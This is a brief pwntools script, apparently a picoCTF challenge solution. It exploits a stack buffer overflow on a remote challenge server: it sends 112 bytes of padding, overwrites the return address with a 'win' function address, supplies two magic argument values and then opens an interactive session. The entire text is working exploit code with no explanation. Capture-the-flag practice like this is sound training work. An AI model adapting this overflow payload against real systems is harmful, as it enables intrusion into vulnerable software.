from pwn import*

p = remote("saturn.picoctf.net", 53003)
#p = process("./vuln")
#gdb.attach(p,api=True)

win = 0x08049296
payload = b"a"*112+ p32(win) + b"a"*4 + p32(0xCAFEF00D) + p32(0xF00DF00D) 

p.sendline(payload)
p.interactive()
